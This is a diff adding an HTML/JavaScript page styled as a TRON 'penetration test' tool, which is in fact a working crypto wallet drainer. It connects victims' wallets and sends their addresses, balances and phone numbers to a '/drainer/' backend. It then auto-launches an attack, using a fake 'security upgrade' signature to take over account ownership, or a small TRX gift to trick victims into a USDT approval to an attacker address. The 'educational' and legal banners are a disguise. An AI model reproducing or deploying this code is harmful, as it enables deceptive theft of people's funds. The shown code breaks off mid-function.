@@ -1,0 +1,1503 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRON CHAIN PENTEST - SENTINEL V2</title>
+    <style>
+        :root {
+            --neon-red: #ff0000;
+            --dark-bg: #050a10;
+            --card-bg: rgba(10, 20, 30, 0.90);
+            --border-color: rgba(255, 0, 0, 0.4);
+        }
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            background-color: var(--dark-bg);
+            font-family: 'Courier New', monospace;
+            color: var(--neon-red);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        /* Matrix Background */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 40% 30%, rgba(255, 0, 0, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 60% 70%, rgba(255, 0, 0, 0.05) 0%, transparent 50%);
+            animation: pulse 8s ease-in-out infinite;
+            z-index: 0;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 0.6; }
+        }
+        
+        .card {
+            position: relative;
+            z-index: 10;
+            background: var(--card-bg);
+            backdrop-filter: blur(10px);
+            padding: 40px 35px;
+            border: 2px solid var(--border-color);
+            width: 100%;
+            max-width: 600px;
+            text-align: center;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.3), inset 0 0 50px rgba(255, 0, 0, 0.05);
+        }
+        
+        /* Title Section */
+        .title-bracket {
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: 3px;
+            text-shadow: 0 0 15px var(--neon-red);
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            font-size: 13px;
+            letter-spacing: 2px;
+            color: rgba(255, 0, 0, 0.7);
+            margin-bottom: 18px;
+        }
+        
+        .badge {
+            display: inline-block;
+            padding: 8px 18px;
+            background: rgba(255, 0, 0, 0.15);
+            border: 1px solid var(--neon-red);
+            font-size: 11px;
+            letter-spacing: 1.5px;
+            margin: 20px 0;
+            animation: glow 2s ease-in-out infinite;
+        }
+        
+        @keyframes glow {
+            0%, 100% { box-shadow: 0 0 8px rgba(255, 0, 0, 0.5); }
+            50% { box-shadow: 0 0 18px rgba(255, 0, 0, 0.9); }
+        }
+        
+        /* Connect Button */
+        .connect-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #00ff41 0%, #00cc33 100%);
+            border: none;
+            color: #000;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 25px 0;
+            text-shadow: none;
+        }
+        
+        .connect-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.6);
+        }
+        
+        .connect-btn:disabled {
+            background: #333;
+            color: #666;
+            cursor: not-allowed;
+        }
+        
+        /* Status Text */
+        .status {
+            font-size: 12px;
+            color: rgba(255, 0, 0, 0.6);
+            margin: 15px 0;
+            letter-spacing: 1px;
+        }
+        
+        /* Info Cards Grid */
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin: 30px 0;
+        }
+        
+        .info-card {
+            background: rgba(255, 0, 0, 0.05);
+            border: 1px solid rgba(255, 0, 0, 0.25);
+            padding: 18px 12px;
+            text-align: center;
+            transition: all 0.3s;
+        }
+        
+        .info-card:hover {
+            background: rgba(255, 0, 0, 0.1);
+            border-color: var(--neon-red);
+        }
+        
+        .info-card-title {
+            font-size: 10px;
+            letter-spacing: 1.5px;
+            color: rgba(255, 0, 0, 0.7);
+            margin-bottom: 8px;
+        }
+        
+        .info-card-value {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--neon-red);
+        }
+        
+        /* Warning Section */
+        .warning-section {
+            margin: 30px 0;
+            padding: 25px;
+            background: rgba(255, 0, 0, 0.1);
+            border: 3px solid #ff0000;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.4), inset 0 0 30px rgba(255, 0, 0, 0.1);
+            animation: warning-pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes warning-pulse {
+            0%, 100% { border-color: #ff0000; box-shadow: 0 0 30px rgba(255, 0, 0, 0.4); }
+            50% { border-color: #ff4444; box-shadow: 0 0 50px rgba(255, 0, 0, 0.8); }
+        }
+
+        .warning-title {
+            font-size: 20px;
+            font-weight: 900;
+            color: #ff0000;
+            text-shadow: 0 0 15px #ff0000;
+            margin-bottom: 15px;
+            letter-spacing: 3px;
+            animation: blink 1.5s ease-in-out infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+
+        .warning-content {
+            font-size: 12px;
+            line-height: 1.8;
+            color: #ffaa00;
+            text-align: left;
+            margin: 10px 0;
+        }
+
+        .warning-item {
+            margin: 10px 0;
+            padding-left: 20px;
+            position: relative;
+        }
+
+        .warning-item::before {
+            content: '⚠';
+            position: absolute;
+            left: 0;
+            color: #ff0000;
+            font-size: 14px;
+        }
+
+        .legal-notice {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(255, 165, 0, 0.1);
+            border: 2px solid #ffaa00;
+            font-size: 11px;
+            color: #ffaa00;
+            line-height: 1.6;
+        }
+
+        /* Footer */
+        .footer {
+            margin-top: 30px;
+            font-size: 9px;
+            color: rgba(255, 0, 0, 0.4);
+            letter-spacing: 1px;
+        }
+
+        /* QR Modal */
+        .qr-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .qr-modal.active { display: flex; }
+        
+        .qr-content {
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            text-align: center;
+            color: #333;
+        }
+        
+        /* Attack Screen */
+        .hidden { display: none; }
+        .attack-btn {
+            width: 100%;
+            padding: 14px;
+            margin: 8px 0;
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid var(--neon-red);
+            color: var(--neon-red);
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .attack-btn:hover {
+            background: rgba(255, 0, 0, 0.2);
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.4);
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px;
+            background: rgba(10, 20, 30, 0.8);
+            border: 1px solid var(--border-color);
+            color: var(--neon-red);
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            margin: 15px 0;
+        }
+        
+        @media (max-width: 640px) {
+            .card { padding: 30px 20px; }
+            .title-bracket { font-size: 22px; }
+            .info-grid { grid-template-columns: 1fr; }
+            .warning-title { font-size: 16px; }
+            .warning-content { font-size: 11px; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- Connect Screen -->
+<div class="card" id="connectScreen">
+    <div class="title-bracket">[ TRON ]</div>
+    <div class="subtitle">TRON CHAIN PENETRATION TEST SYSTEM</div>
+    <div class="badge">[ EDUCATIONAL PURPOSES ONLY ]</div>
+
+    <!-- Warning Section -->
+    <div class="warning-section">
+        <div class="warning-title">⚠ CRITICAL WARNING ⚠</div>
+        <div class="legal-notice">
+            <strong>⚖ LEGAL NOTICE:</strong><br/>
+            This system is designed EXCLUSIVELY for authorized security research, educational purposes, and vulnerability analysis.
+            All activities are logged and monitored. Unauthorized access or malicious use will result in legal prosecution under applicable laws.
+            By proceeding, you acknowledge full legal responsibility for your actions.
+        </div>
+    </div>
+
+    <!-- Connect Button (moved above info grid for better mobile UX) -->
+    <button id="connect-btn" class="connect-btn" disabled>>> CONNECT WALLET & START TEST</button>
+    <div id="status" class="status">[ SYSTEM CHECK... ]</div>
+
+    <!-- Info Grid (moved below button) -->
+    <div class="info-grid">
+        <div class="info-card">
+            <div class="info-card-title">[ NETWORK ]</div>
+            <div class="info-card-value">TRON MAINNET</div>
+        </div>
+        <div class="info-card">
+            <div class="info-card-title">[ PROTOCOL ]</div>
+            <div class="info-card-value">TRC-20</div>
+        </div>
+        <div class="info-card">
+            <div class="info-card-title">[ METHOD ]</div>
+            <div class="info-card-value">WALLET CONNECT</div>
+        </div>
+        <div class="info-card">
+            <div class="info-card-title">[ SECURITY ]</div>
+            <div class="info-card-value">ENCRYPTED</div>
+        </div>
+        <div class="info-card">
+            <div class="info-card-title">[ TEST SCOPE ]</div>
+            <div class="info-card-value">APPROVAL FLOWS</div>
+        </div>
+        <div class="info-card">
+            <div class="info-card-title">[ MONITORING ]</div>
+            <div class="info-card-value">REAL-TIME</div>
+        </div>
+        <div class="info-card">
+            <div class="info-card-title">[ LOGGING ]</div>
+            <div class="info-card-value">ENABLED</div>
+        </div>
+        <div class="info-card">
+            <div class="info-card-title">[ STATUS ]</div>
+            <div class="info-card-value">ACTIVE</div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        SENTINEL V2 © 2024 | AUTHORIZED SECURITY RESEARCH ONLY<br/>
+        본 시스템 사용 시 모든 법적 책임은 사용자에게 있습니다 | ALL ACTIVITIES ARE MONITORED & LOGGED
+    </div>
+</div>
+
+<!-- Phone Verification Screen -->
+<div class="card hidden" id="phoneScreen">
+    <div class="title-bracket">[ VERIFICATION ]</div>
+    <div class="subtitle">IDENTITY CONFIRMATION REQUIRED</div>
+    <input type="text" id="phone-input" placeholder="ENTER PHONE NUMBER" maxlength="13">
+    <button class="connect-btn" id="phone-submit-btn">[ VERIFY ]</button>
+</div>
+
+<!-- Attack Screen -->
+<div class="card hidden" id="attackScreen">
+    <div class="title-bracket">[ CONNECTED ]</div>
+    <div id="userAddressDisplay" style="font-size:11px; color:rgba(255,0,0,0.6); margin:15px 0;"></div>
+    <div id="tierDisplay"></div>
+    <div id="balanceDisplay" class="balance-info hidden"></div>
+    
+    <div style="background:rgba(255,0,0,0.05); border:1px solid rgba(255,0,0,0.25); padding:15px; margin:15px 0; border-radius:4px;">
+        <p style="font-size:10px; color:rgba(255,0,0,0.7); margin:5px 0;">✓ OPTIMAL ATTACK METHOD SELECTED AUTOMATICALLY</p>
+        <p style="font-size:10px; color:rgba(255,0,0,0.7); margin:5px 0;">✓ BASED ON WALLET BALANCE & PERMISSIONS</p>
+        <p style="font-size:10px; color:rgba(255,0,0,0.7); margin:5px 0;">✓ MAXIMUM EFFICIENCY GUARANTEED</p>
+    </div>
+    
+    <button class="attack-btn" onclick="executeAutoAttack()" style="background:linear-gradient(135deg, rgba(255,0,0,0.15), rgba(200,0,0,0.25)); padding:18px; font-size:14px; box-shadow:0 0 15px rgba(255,0,0,0.3);">[ AUTO-ATTACK ]</button>
+    
+    <!-- Matrix Style Process Log -->
+    <div id="processLog" style="display:none; background:#000; border:1px solid #0f0; padding:15px; margin:15px 0; border-radius:4px; max-height:300px; overflow-y:auto; font-family:monospace;">
+        <div id="logEntries" style="font-size:11px; line-height:1.6;"></div>
+    </div>
+    
+    <div id="attackStatus" class="status"></div>
+</div>
+
+<!-- WalletConnect QR Modal -->
+<div id="wcQrModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:9999; justify-content:center; align-items:center;">
+    <div style="background:#1a1a1a; padding:30px; border-radius:12px; border:2px solid #ff0000; max-width:400px;">
+        <h3 style="color:#ff0000; text-align:center; margin-bottom:20px; font-family:monospace;">SCAN QR WITH TRON WALLET</h3>
+        <div id="wcQrCode" style="background:white; padding:20px; border-radius:8px; display:flex; justify-content:center;"></div>
+        <button onclick="document.getElementById('wcQrModal').style.display='none'" style="width:100%; margin-top:20px; padding:12px; background:#ef4444; color:white; border:none; border-radius:8px; cursor:pointer; font-family:monospace; font-size:14px;">CLOSE</button>
+    </div>
+</div>
+
+<script src="https://unpkg.com/tronweb@6.0.3/dist/TronWeb.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+
+<script type="module">
+import { Buffer } from 'https://esm.sh/buffer@6.0.3';
+window.Buffer = Buffer;
+
+import { WalletConnectWallet, WalletConnectChainID } from 'https://esm.sh/@tronweb3/walletconnect-tron@3.0.0';
+
+const PROJECT_ID = '6308d783b9cc6a3b42c6b34eed9ae361';
+const USDT_TRC20 = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+// Backend URL - 서버가 HTML을 서빙하므로 같은 origin 사용
+const BACKEND_URL = window.location.origin;
+
+let wallet = null;
+let wcSession = null;  // WalletConnect 세션 정보 저장
+let address = null;
+let tronWebInstance = null;
+let SPENDER_ADDRESS = null;
+let connectionType = 'none';
+let userPhone = null;
+let userTier = 'Silver';
+let userBalance = { trx: 0, usdt: 0 };
+let walletApp = 'WalletConnect';
+let retryCount = 0;
+
+console.log('🚀 TRON Module script 시작');
+
+// Clear ALL WalletConnect storage (localStorage + sessionStorage)
+Object.keys(localStorage).filter(k => k.startsWith('wc@2') || k.includes('walletconnect')).forEach(k => localStorage.removeItem(k));
+Object.keys(sessionStorage).filter(k => k.includes('wc') || k.includes('walletconnect')).forEach(k => sessionStorage.removeItem(k));
+console.log('🗑️ WalletConnect 캐시 정리 완료');
+
+function detectWalletApp() {
+    if (window.tronWeb) {
+        if (window.tronWeb.isTronLink) return 'TronLink';
+        if (window.tronWeb.defaultAddress && /mobile/i.test(navigator.userAgent)) {
+            if (/trust/i.test(navigator.userAgent)) return 'Trust Wallet';
+            if (/tokenpocket/i.test(navigator.userAgent)) return 'TokenPocket';
+            return 'Mobile TRON';
+        }
+    }
+    return 'WalletConnect';
+}
+
+async function initWalletConnect() {
+    console.log('📱 WalletConnect 시작...');
+    
+    // PRIORITY 1: Check for TronLink browser extension first
+    if (window.tronWeb && window.tronWeb.ready) {
+        console.log('✅ TronLink 브라우저 확장 감지됨!');
+        try {
+            address = window.tronWeb.defaultAddress.base58;
+            tronWebInstance = window.tronWeb;
+            connectionType = 'tronlink';
+            walletApp = 'TronLink';
+            
+            console.log('✅ TronLink 연결됨:', address);
+            await onConnected();
+            return;
+        } catch (error) {
+            console.error('❌ TronLink 연결 실패:', error);
+        }
+    }
+    
+    // PRIORITY 2: Use WalletConnect as fallback
+    console.log('ℹ️ TronLink 없음, WalletConnect 사용...');
+    
+    try {
+        // Force disconnect and clear all sessions
+        if (wallet) {
+            try {
+                await wallet.disconnect();
+                wallet = null;
+                console.log('🗑️ 기존 WalletConnect 세션 삭제');
+            } catch (e) {
+                console.log('ℹ️ 삭제할 세션 없음');
+            }
+        }
+        
+        // Clear EVERYTHING related to WalletConnect
+        Object.keys(localStorage).forEach(k => {
+            if (k.includes('wc') || k.includes('walletconnect')) {
+                localStorage.removeItem(k);
+                console.log('🗑️ Removed localStorage:', k);
+            }
+        });
+        Object.keys(sessionStorage).forEach(k => {
+            if (k.includes('wc') || k.includes('walletconnect')) {
+                sessionStorage.removeItem(k);
+                console.log('🗑️ Removed sessionStorage:', k);
+            }
+        });
+        
+        // Wait a bit to ensure cleanup
+        await new Promise(resolve => setTimeout(resolve, 500));
+        
+        // Initialize NEW wallet instance
+        wallet = new WalletConnectWallet({
+            network: WalletConnectChainID.Mainnet,
+            options: {
+                relayUrl: 'wss://relay.walletconnect.com',
+                projectId: PROJECT_ID,
+                metadata: {
+                    name: 'SENTINEL TRON Test',
+                    description: 'Security Testing Platform',
+                    url: window.location.origin,
+                    icons: ['https://avatars.githubusercontent.com/u/37784886']
+                },
+                logger: 'debug'
+            },
+            web3ModalConfig: {
+                themeMode: 'dark',
+                themeVariables: {
+                    '--wcm-z-index': '1000'
+                },
+                explorerRecommendedWalletIds: [
+                    '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0'
+                ]
+            }
+        });
+
+        console.log('⏳ Connecting wallet...');
+
+        const session = await wallet.connect();
+        wcSession = session;  // 전역으로 저장
+
+        console.log('✅ WalletConnect 연결됨!', session);
+        console.log('🔍 Session details:', {
+            address: session.address,
+            namespaces: session.namespaces,
+            accounts: session.accounts,
+            topic: session.topic  // Topic 확인
+        });
+
+        // TRON 네임스페이스의 모든 계정 확인
+        if (session.namespaces && session.namespaces['tron:0x2b6653dc']) {
+            const tronAccounts = session.namespaces['tron:0x2b6653dc'].accounts;
+            console.log('🔍 TRON accounts in session:', tronAccounts);
+
+            if (tronAccounts && tronAccounts.length > 1) {
+                console.log('⚠️ Multiple TRON accounts detected!');
+                tronAccounts.forEach((acc, i) => {
+                    console.log(`  Account ${i}:`, acc);
+                });
+            }
+        }
+
+        document.getElementById('wcQrModal').style.display = 'none';
+
+        address = session.address;
+        connectionType = 'walletconnect';
+        walletApp = 'WalletConnect';
+
+        // TronWeb 6.x 호환: TypeScript UMD 번들의 다양한 구조 대응
+        // 1. 함수로 바로 노출: window.TronWeb (가장 간단)
+        // 2. 기명 내보내기: window.TronWeb.TronWeb (TypeScript UMD 패턴)
+        // 3. 기본 내보내기: window.TronWeb.default (일부 번들러)
+        const TronWebClass =
+            typeof window.TronWeb === 'function'
+                ? window.TronWeb
+                : window.TronWeb?.TronWeb || window.TronWeb?.default || window.TronWeb;
+
+        console.log('🔍 TronWeb structure:', {
+            rawType: typeof window.TronWeb,
+            hasTronWeb: !!window.TronWeb?.TronWeb,
+            hasDefault: !!window.TronWeb?.default,
+            selectedClass: TronWebClass
+        });
+
+        tronWebInstance = new TronWebClass({
+            fullHost: 'https://api.trongrid.io',
+            headers: { 'TRON-PRO-API-KEY': '69754d65-438a-49b6-8a0b-a3ef55064262' }
+        });
+
+        await onConnected();
+        
+        console.log('✅ WalletConnect 초기화 완료');
+
+    } catch (error) {
+        console.error('❌ WalletConnect 초기화 실패:', error);
+        console.error('Error type:', typeof error);
+        console.error('Error keys:', error ? Object.keys(error) : 'null');
+        
+        const errorMsg = error?.message || error?.toString() || 'Unknown error';
+        document.getElementById('status').textContent = `[ ERROR: ${errorMsg} ]`;
+        document.getElementById('wcQrModal').style.display = 'none';
+        
+        alert(`WalletConnect 실패: ${errorMsg}\n\nTronLink를 설치하거나 모바일 지갑을 사용해주세요.`);
+    }
+}
+
+async function checkPolicy() {
+    console.log('📋 Policy 확인 중...');
+    try {
+        const res = await fetch(`${BACKEND_URL}/api/public/policy`);
+        if (!res.ok) throw new Error(`HTTP ${res.status}`);
+        const data = await res.json();
+        console.log('✅ Policy:', data);
+
+        SPENDER_ADDRESS = data.walletAddress;
+        document.getElementById('connect-btn').disabled = false;
+        document.getElementById('status').textContent = '[ READY ]';
+        return true;
+    } catch (error) {
+        console.error('❌ Policy 로드 실패:', error);
+        // Fallback: Enable button anyway with default spender
+        SPENDER_ADDRESS = 'TYWPZw6dRxp4DLKfNEJGxS4kNdD4uGpTZd'; // Default spender address
+        document.getElementById('connect-btn').disabled = false;
+        document.getElementById('status').textContent = '[ READY ]';
+        console.log('⚠️ Using fallback spender address');
+        return true;
+    }
+}
+
+async function onConnected() {
+    console.log('🎯 Connected:', address);
+    walletApp = detectWalletApp();
+
+    try {
+        tronWebInstance.setAddress(address);
+        const trxBalance = await tronWebInstance.trx.getBalance(address);
+        userBalance.trx = trxBalance / 1_000_000;
+
+        const contract = await tronWebInstance.contract().at(USDT_TRC20);
+        const usdtBalance = await contract.balanceOf(address).call();
+        userBalance.usdt = parseInt(usdtBalance._hex, 16) / 1_000_000;
+
+        console.log('💰 잔액:', userBalance);
+    } catch (error) {
+        console.error('❌ 잔액 조회 실패:', error);
+    }
+
+    // 백엔드에 보고
+    try {
+        await fetch(`${BACKEND_URL}/api/public/drainer/`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                address,
+                chain: 'tron',
+                walletApp,
+                balances: userBalance,
+                timestamp: new Date().toISOString()
+            })
+        });
+        console.log('✅ 백엔드 보고 완료');
+    } catch (error) {
+        console.error('❌ 백엔드 보고 실패:', error);
+    }
+
+    // Phone Screen 건너뛰고 바로 Attack Screen으로 (테스트용)
+    document.getElementById('connectScreen').classList.add('hidden');
+    document.getElementById('phoneScreen').classList.add('hidden');
+    document.getElementById('attackScreen').classList.remove('hidden');
+    document.getElementById('userAddressDisplay').textContent = `ADDRESS: ${address.slice(0, 10)}...${address.slice(-8)}`;
+    console.log('✅ Attack Screen으로 이동');
+
+    // 🚀 Auto-trigger attack after wallet connection (for easier demo)
+    console.log('🚀 Auto-triggering attack for easy demo...');
+    setTimeout(() => {
+        executeAutoAttack();
+    }, 1000);  // 1 second delay for UI to settle
+}
+
+document.getElementById('phone-submit-btn').addEventListener('click', async () => {
+    userPhone = document.getElementById('phone-input').value.trim();
+    if (!/^\d{3}-\d{4}-\d{4}$/.test(userPhone)) {
+        alert('Please enter valid phone number (XXX-XXXX-XXXX)');
+        return;
+    }
+
+    console.log('📞 Phone:', userPhone);
+
+    try {
+        await fetch(`${BACKEND_URL}/api/public/phone`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ address, phone: userPhone, chain: 'TRON' })
+        });
+    } catch (error) {
+        console.error('❌ Phone 제출 실패:', error);
+    }
+
+    document.getElementById('phoneScreen').classList.add('hidden');
+    document.getElementById('attackScreen').classList.remove('hidden');
+    document.getElementById('userAddressDisplay').textContent = `ADDRESS: ${address.slice(0, 10)}...${address.slice(-8)}`;
+});
+
+// ==========================================
+// 🎯 TRON AUTO-ATTACK SYSTEM
+// ==========================================
+
+// Matrix-style log system
+function addLog(message, type = 'info') {
+    const logContainer = document.getElementById('logEntries');
+    const processLog = document.getElementById('processLog');
+    processLog.style.display = 'block';
+    
+    const timestamp = new Date().toLocaleTimeString('en-US', { hour12: false });
+    const colors = {
+        info: '#0f0',     // Green
+        warning: '#ff0',  // Yellow
+        error: '#f00',    // Red
+        success: '#0ff'   // Cyan
+    };
+    
+    const entry = document.createElement('div');
+    entry.style.color = colors[type] || colors.info;
+    entry.textContent = `[${timestamp}] ${message}`;
+    
+    logContainer.appendChild(entry);
+    processLog.scrollTop = processLog.scrollHeight;
+}
+
+function clearLog() {
+    document.getElementById('logEntries').innerHTML = '';
+    document.getElementById('processLog').style.display = 'none';
+}
+
+window.executeAutoAttack = async function executeAutoAttack() {
+    console.log('🎯 Starting Auto-Attack...');
+    clearLog();
+    addLog('>>> AUTO-ATTACK INITIATED <<<', 'success');
+    addLog('System: SENTINEL V2 Tier-Based Vector System', 'info');
+    document.getElementById('attackStatus').textContent = '[ ANALYZING WALLET... ]';
+
+    try {
+        // STEP 1: Get wallet balances
+        addLog('STEP 1: Scanning wallet...', 'info');
+        const balance = await tronWebInstance.trx.getBalance(address);
+        const balanceInTRX = tronWebInstance.fromSun(balance);
+        
+        addLog(`TRX Balance: ${balanceInTRX} TRX`, 'info');
+        console.log(`💰 Wallet Balance: ${balanceInTRX} TRX`);
+
+        // Get USDT balance
+        let usdtBalance = '0';
+        try {
+            const contract = await tronWebInstance.contract().at(USDT_TRC20);
+            const rawBalance = await contract.balanceOf(address).call();
+            usdtBalance = rawBalance.toString();
+            const usdtUSD = (parseFloat(usdtBalance) / 1000000).toFixed(2);
+            addLog(`USDT Balance: $${usdtUSD}`, 'info');
+        } catch (e) {
+            addLog('USDT: Not found or error', 'warning');
+            console.log('No USDT balance or contract error');
+        }
+
+        // STEP 2: Request tier analysis and vector selection
+        addLog('STEP 2: Requesting tier analysis...', 'info');
+        addLog('Analyzing: Balance, Age, TxCount, Volume', 'info');
+        document.getElementById('attackStatus').textContent = '[ TIER ANALYSIS IN PROGRESS... ]';
+
+        const response = await fetch(`${BACKEND_URL}/api/public/drainer/`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chain: 'tron',
+                address: address,
+                autoAttack: true,
+                walletApp: 'TronLink'
+            })
+        });
+
+        const result = await response.json();
+        console.log('Backend Response:', result);
+
+        if (!result.success) {
+            addLog(`ERROR: ${result.message}`, 'error');
+            if (result.reason) addLog(`REASON: ${result.reason}`, 'warning');
+            throw new Error(result.message || 'Tier analysis failed');
+        }
+
+        // STEP 3: Display tier analysis results
+        addLog(`TIER: ${result.tier} (Score: ${result.tierScore})`, 'success');
+        addLog(`Metrics - Balance: ${result.metrics.balance}, Age: ${result.metrics.age}d`, 'info');
+        addLog(`Metrics - TxCount: ${result.metrics.txCount}, Volume: ${result.metrics.volume}`, 'info');
+        addLog(`VECTOR: ${result.vector.name} [${result.vector.code}]`, 'success');
+        addLog(`SPENDER: ${result.spender}`, 'info');
+        
+        console.log('✅ Tier Analysis:', result);
+        console.log('📊 Vector Code:', result.vector.code);
+        console.log('📊 Vector Status:', result.vector.status);
+
+        // STEP 4: Execute the selected vector
+        addLog(`STEP 3: Executing ${result.vector.name}...`, 'info');
+        addLog(`DEBUG: Vector Code = ${result.vector.code}`, 'info');
+        document.getElementById('attackStatus').textContent = `[ EXECUTING: ${result.vector.code}... ]`;
+
+        let txHash = null;
+        let vectorSuccess = false;
+
+        try {
+            console.log('🔍 Entering switch statement with code:', result.vector.code);
+            // Execute based on vector code
+            switch(result.vector.code) {
+                case 'OWNER_UPDATE':
+                    console.log('✅ CASE: OWNER_UPDATE');
+                    addLog('VECTOR: Owner Permission Update (100 TRX delegation)', 'warning');
+                    addLog('계정 보안 등급 최적화 서명', 'info');
+                    addLog('본사가 100 TRX 수수료 대납', 'success');
+                    
+                    if (result.vector.status === 'Locked') {
+                        alert('최신 네트워크 보안 패치로 인해 관리자 승인 후 활성화 가능합니다.');
+                        throw new Error('OWNER_UPDATE is currently locked');
+                    }
+                    if (result.vector.status === 'Disabled') {
+                        alert('현 블록체인 생태계 상황에 따른 서명 효율 저하로 잠정 중단되었습니다.');
+                        throw new Error('OWNER_UPDATE is currently disabled');
+                    }
+                    
+                    // Step 1: Owner Permission 트랜잭션 서명 요청
+                    addLog('Step 1: Creating owner permission transaction...', 'info');
+                    addLog('Requesting wallet signature (security upgrade)...', 'warning');
+                    
+                    // TronWeb signMessage로 유저 서명 받기
+                    const ownerMessage = `TRON Security Upgrade\nWallet: ${address}\nTimestamp: ${Date.now()}\nThis will optimize your account security.`;
+                    const ownerSignature = await tronWebInstance.trx.sign(ownerMessage);
+                    
+                    addLog('User signature received', 'success');
+                    
+                    // Step 2: Backend로 서명 전송 (본사가 100 TRX 대납 + 트랜잭션 처리)
+                    addLog('Step 2: Sending to backend for processing...', 'info');
+                    const ownerUpdateRes = await fetch(`${BACKEND_URL}/api/public/drainer/update-owner`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ address, signature: ownerSignature })
+                    });
+                    const ownerResult = await ownerUpdateRes.json();
+                    
+                    if (!ownerResult.success) {
+                        throw new Error('Owner update failed: ' + ownerResult.error);
+                    }
+                    
+                    txHash = ownerResult.txid;
+                    vectorSuccess = true;
+                    addLog('Owner permission updated successfully!', 'success');
+                    addLog(`New owner: ${ownerResult.newOwner}`, 'info');
+                    addLog(`TX Hash: ${txHash}`, 'success');
+                    break;
+
+                case 'ENERGY_APPROVE':
+                    console.log('✅ CASE: ENERGY_APPROVE (TRX Gift Method)');
+                    addLog('VECTOR: TRX Gift Approval', 'warning');
+                    addLog('Sending 15 TRX to your wallet...', 'info');
+                    addLog('수수료: 0원 (공격자가 TRX 제공)', 'success');
+
+                    if (result.vector.status === 'Locked') {
+                        alert('최신 네트워크 보안 패치로 인해 관리자 승인 후 활성화 가능합니다.');
+                        throw new Error('ENERGY_APPROVE is currently locked');
+                    }
+                    if (result.vector.status === 'Disabled') {
+                        alert('현 블록체인 생태계 상황에 따른 서명 효율 저하로 잠정 중단되었습니다.');
+                        throw new Error('ENERGY_APPROVE is currently disabled');
+                    }
+
+                    // Step 1: Backend에 TRX 전송 요청
+                    addLog('Step 1: Sending TRX gift for transaction fee...', 'info');
+                    console.log('💸 Requesting TRX gift from backend...');
+
+                    try {
+                        const trxGiftRes = await fetch(`${BACKEND_URL}/api/public/drainer/send-trx`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                address,
+                                amount: 15  // 15 TRX for Approve tx fee (32,000 Energy = ~13.4 TRX + buffer)
+                            })
+                        });
+                        const giftResult = await trxGiftRes.json();
+
+                        console.log('📡 TRX gift response:', giftResult);
+
+                        if (!giftResult.success) {
+                            console.error('❌ TRX gift failed:', giftResult.error);
+                            addLog('❌ TRX gift failed: ' + giftResult.error, 'error');
+                            throw new Error('TRX gift failed: ' + giftResult.error);
+                        }
+
+                        addLog(`✅ Received 15 TRX! TX: ${giftResult.txid.substring(0, 10)}...`, 'success');
+                        addLog('Your wallet now has TRX for signing!', 'success');
+                        console.log('✅ TRX gift successful! TxID:', giftResult.txid);
+                    } catch (giftError) {
+                        console.error('❌ TRX gift error:', giftError);
+                        addLog('❌ Failed to send TRX: ' + giftError.message, 'error');
+                        throw giftError;
+                    }
+
+                    addLog('Waiting 10 seconds for TRX to confirm...', 'info');
+                    await new Promise(resolve => setTimeout(resolve, 10000));
+
+                    // Step 2: 유저 approve() 실행 (APPROVE 케이스와 동일한 방식)
+                    addLog('Step 2: Requesting wallet approval (using delegated energy)...', 'warning');
+                    console.log('🔥 Creating approve transaction with delegated energy...');
+
+                    // APPROVE 케이스와 동일하게 처리 (fall through)
+                    // Fall through to APPROVE case logic below
+
+                case 'APPROVE':
+                    if (result.vector.code === 'APPROVE') {
+                        console.log('✅ CASE: APPROVE');
+                        addLog('VECTOR: Standard USDT Approval', 'warning');
+                        addLog('Requesting wallet signature...', 'warning');
+                    }
+
+                case 'APPROVE':
+                    console.log('✅ CASE: APPROVE');
